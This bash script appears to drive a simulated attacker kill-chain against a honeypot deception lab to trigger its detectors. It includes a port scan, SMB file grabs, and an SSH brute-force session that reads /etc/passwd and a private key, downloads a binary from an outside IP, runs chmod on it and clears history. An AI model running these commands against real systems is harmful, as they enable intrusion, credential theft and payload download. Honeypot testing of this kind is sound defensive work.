#!/usr/bin/env bash
# Real attacker kill-chain against the live deception lab. Run attached to the
# deception network so services are reachable by their compose names. Every
# interaction here is observed by a honeypot/tripwire and forwarded to the hub.
#
# Never fail hard: a service may be absent in a partial bring-up; keep going so
# the rest of the chain still exercises what IS running.
set +e
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAuthentication=no \
  -o KexAlgorithms=+diffie-hellman-group14-sha1 -o ConnectTimeout=8"

echo "=============================================================="
echo " [attacker] target subnet: the Meridian deception grid"
echo "=============================================================="

echo
echo "[1/4] RECON — port scan across the decoy hosts"
nmap -Pn --host-timeout 20s -p 21,22,80,445,2222,3306 \
  cowrie opencanary fileserver intranet jumphost 2>&1 | grep -E 'Nmap scan|open|Nmap done'

echo
echo "[2/4] SMB DISCOVERY + EXFIL — pull the juicy (canaried) files"
smbclient //fileserver/company -N -c 'ls' 2>&1 | head -15
smbclient //fileserver/company -N -c 'cd it; ls; get passwords.xlsx /tmp/passwords.xlsx' 2>&1 | head -6
smbclient //fileserver/company -N -c 'cd finance; get vendor_payments.xlsx /tmp/vp.xlsx' 2>&1 | head -3
echo "   (loot dropped in /tmp inside attacker container — the canary just fired)"

echo
echo "[3/4] TRIPWIRE — poke OpenCanary's fake services"
nc -w 3 opencanary 21 </dev/null 2>&1 | head -1
nc -w 3 opencanary 3306 </dev/null 2>&1 | head -1
curl -s -m 3 http://opencanary/login -o /dev/null 2>&1

echo
echo "[4/4] SSH HONEYPOT — brute into cowrie and run a recon session"
sshpass -p 'hunter2' ssh $SSH_OPTS -p 2222 root@cowrie \
  'uname -a; whoami; id; cat /etc/passwd; ls -la /root; cat /root/.ssh/id_rsa; wget http://185.220.101.7/x86 -O /tmp/x86; chmod +x /tmp/x86; history -c' \
  2>&1 | head -40

echo
echo "=============================================================="
echo " [attacker] kill-chain complete — check the hub dashboard"
echo "=============================================================="
